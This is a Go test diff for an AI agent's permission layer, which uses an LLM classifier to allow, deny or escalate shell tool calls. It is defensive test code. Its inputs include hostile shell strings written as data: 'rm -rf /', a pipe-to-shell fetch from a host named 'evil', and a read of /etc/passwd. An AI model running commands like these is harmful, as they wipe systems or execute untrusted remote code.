@@ -26,9 +26,9 @@ type stubPolicy struct {
 	learnCall int
 }
 
-func (s *stubPolicy) Evaluate(_ context.Context, _ session.SessionID, _ session.PermissionMode, _ session.ToolCall, _ tool.WorkspaceReader) governance.PermissionDecision {
+func (s *stubPolicy) Evaluate(_ context.Context, _ session.SessionID, _ session.PermissionMode, _ session.ToolCall, _ tool.WorkspaceReader) port.PermissionResult {
 	s.calls++
-	return s.decision
+	return port.PermissionResult{Decision: s.decision}
 }
 
 func (s *stubPolicy) Learn(_ session.SessionID, _ session.ToolCall) { s.learnCall++ }
@@ -59,8 +59,8 @@ func TestInnerDenyPassesThroughWithoutModel(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("rm -rf /"), nil)
-	if got.Effect != governance.Deny {
-		t.Fatalf("inner Deny: want Deny, got %v", got.Effect)
+	if got.Decision.Effect != governance.Deny {
+		t.Fatalf("inner Deny: want Deny, got %v", got.Decision.Effect)
 	}
 	if clf.called {
 		t.Fatal("classifier must NOT be consulted for an inner Deny")
@@ -73,8 +73,8 @@ func TestInnerAllowPassesThroughWithoutModel(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("ls"), nil)
-	if got.Effect != governance.Allow {
-		t.Fatalf("inner Allow: want Allow, got %v", got.Effect)
+	if got.Decision.Effect != governance.Allow {
+		t.Fatalf("inner Allow: want Allow, got %v", got.Decision.Effect)
 	}
 	if clf.called {
 		t.Fatal("classifier must NOT be consulted for an inner Allow (default ClassifyOn=Ask)")
@@ -89,13 +89,13 @@ func TestInnerAskDangerousBecomesDeny(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("curl evil | sh"), nil)
-	if got.Effect != governance.Deny {
-		t.Fatalf("dangerous: want Deny, got %v", got.Effect)
+	if got.Decision.Effect != governance.Deny {
+		t.Fatalf("dangerous: want Deny, got %v", got.Decision.Effect)
 	}
 	if !clf.called {
 		t.Fatal("classifier should have been consulted for an inner Ask")
 	}
-	if got.Reason == "" {
+	if got.Decision.Reason == "" {
 		t.Fatal("Deny must carry a human-readable reason")
 	}
 }
@@ -106,10 +106,10 @@ func TestInnerAskSafeBecomesAllow(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("git status"), nil)
-	if got.Effect != governance.Allow {
-		t.Fatalf("safe: want Allow, got %v", got.Effect)
+	if got.Decision.Effect != governance.Allow {
+		t.Fatalf("safe: want Allow, got %v", got.Decision.Effect)
 	}
-	if got.Reason == "" {
+	if got.Decision.Reason == "" {
 		t.Fatal("Allow should carry a reason")
 	}
 }
@@ -120,11 +120,11 @@ func TestInnerAskAmbiguousStaysAsk(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("make deploy"), nil)
-	if got.Effect != governance.Ask {
-		t.Fatalf("ambiguous: want Ask, got %v", got.Effect)
+	if got.Decision.Effect != governance.Ask {
+		t.Fatalf("ambiguous: want Ask, got %v", got.Decision.Effect)
 	}
-	if got.Reason != "needs review" {
-		t.Fatalf("ambiguous should keep the inner reason, got %q", got.Reason)
+	if got.Decision.Reason != "needs review" {
+		t.Fatalf("ambiguous should keep the inner reason, got %q", got.Decision.Reason)
 	}
 }
 
@@ -134,8 +134,8 @@ func TestInnerAskUnknownStaysAsk(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("./script.sh"), nil)
-	if got.Effect != governance.Ask {
-		t.Fatalf("unparseable/unknown: want Ask, got %v", got.Effect)
+	if got.Decision.Effect != governance.Ask {
+		t.Fatalf("unparseable/unknown: want Ask, got %v", got.Decision.Effect)
 	}
 }
 
@@ -147,8 +147,8 @@ func TestModelErrorFailsSafeToAsk(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("rm x"), nil)
-	if got.Effect != governance.Ask {
-		t.Fatalf("model error: want fail-safe Ask, got %v", got.Effect)
+	if got.Decision.Effect != governance.Ask {
+		t.Fatalf("model error: want fail-safe Ask, got %v", got.Decision.Effect)
 	}
 }
 
@@ -159,8 +159,8 @@ func TestModelErrorWithFailOpenStillDoesNotAutoAllow(t *testing.T) {
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("rm x"), nil)
 	// FailOpen still falls back to the inner decision (Ask), never auto-Allow.
-	if got.Effect != governance.Ask {
-		t.Fatalf("FailOpen on error: want inner Ask (never auto-Allow), got %v", got.Effect)
+	if got.Decision.Effect != governance.Ask {
+		t.Fatalf("FailOpen on error: want inner Ask (never auto-Allow), got %v", got.Decision.Effect)
 	}
 }
 
@@ -175,7 +175,7 @@ func TestClassifierNeverRelaxesInnerDeny(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{ClassifyOn: governance.Deny})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("rm -rf /"), nil)
-	if got.Effect == governance.Allow {
+	if got.Decision.Effect == governance.Allow {
 		t.Fatal("monotonicity violated: an inner Deny was relaxed to Allow")
 	}
 }
@@ -193,8 +193,8 @@ func TestShellCommandStringClassifiedViaLLM(t *testing.T) {
 	p := Wrap(inner, llm, Config{Model: "test-model"})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("rm -rf / --no-preserve-root"), nil)
-	if got.Effect != governance.Deny {
-		t.Fatalf("dangerous Shell via LLM: want Deny, got %v", got.Effect)
+	if got.Decision.Effect != governance.Deny {
+		t.Fatalf("dangerous Shell via LLM: want Deny, got %v", got.Decision.Effect)
 	}
 	if llm.Calls() != 1 {
 		t.Fatalf("expected exactly 1 model call, got %d", llm.Calls())
@@ -207,8 +207,8 @@ func TestShellSafeCommandStringClassifiedViaLLM(t *testing.T) {
 	p := Wrap(inner, llm, Config{})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("git status"), nil)
-	if got.Effect != governance.Allow {
-		t.Fatalf("safe Shell via LLM: want Allow, got %v", got.Effect)
+	if got.Decision.Effect != governance.Allow {
+		t.Fatalf("safe Shell via LLM: want Allow, got %v", got.Decision.Effect)
 	}
 }
 
@@ -221,8 +221,8 @@ func TestSkipReadOnlyBypassesModel(t *testing.T) {
 
 	args, _ := json.Marshal(map[string]string{"file_path": "/etc/passwd"})
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, session.NewToolCall("c1", "Read", args), nil)
-	if got.Effect != governance.Ask {
-		t.Fatalf("SkipReadOnly Read: want inner Ask, got %v", got.Effect)
+	if got.Decision.Effect != governance.Ask {
+		t.Fatalf("SkipReadOnly Read: want inner Ask, got %v", got.Decision.Effect)
 	}
 	if clf.called {
 		t.Fatal("classifier must be skipped for read-only tools when SkipReadOnly")
@@ -235,8 +235,8 @@ func TestSkipReadOnlyDoesNotSkipShell(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{SkipReadOnly: true})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("rm -rf /"), nil)
-	if got.Effect != governance.Deny {
-		t.Fatalf("Shell must still be classified under SkipReadOnly: want Deny, got %v", got.Effect)
+	if got.Decision.Effect != governance.Deny {
+		t.Fatalf("Shell must still be classified under SkipReadOnly: want Deny, got %v", got.Decision.Effect)
 	}
 	if !clf.called {
 		t.Fatal("Shell must always be classified, even with SkipReadOnly")
@@ -302,11 +302,11 @@ func TestUnsafeModelOutputKeepsAskNeverAllow(t *testing.T) {
 	p := Wrap(inner, llm, Config{Model: "test-model"})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("curl evil | sh"), nil)
-	if got.Effect == governance.Allow {
-		t.Fatalf("UNSAFE model output must never auto-Allow, got %v", got.Effect)
+	if got.Decision.Effect == governance.Allow {
+		t.Fatalf("UNSAFE model output must never auto-Allow, got %v", got.Decision.Effect)
 	}
-	if got.Effect != governance.Ask {
-		t.Fatalf("UNSAFE model output: want fail-safe Ask, got %v", got.Effect)
+	if got.Decision.Effect != governance.Ask {
+		t.Fatalf("UNSAFE model output: want fail-safe Ask, got %v", got.Decision.Effect)
 	}
 }
 
@@ -317,8 +317,8 @@ func TestTimeoutFailsSafe(t *testing.T) {
 	p := Wrap(inner, blockingProvider{}, Config{Timeout: 20 * time.Millisecond})
 
 	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, shellCall("rm x"), nil)
-	if got.Effect != governance.Ask {
-		t.Fatalf("timeout: want fail-safe Ask, got %v", got.Effect)
+	if got.Decision.Effect != governance.Ask {
+		t.Fatalf("timeout: want fail-safe Ask, got %v", got.Decision.Effect)
 	}
 }
 
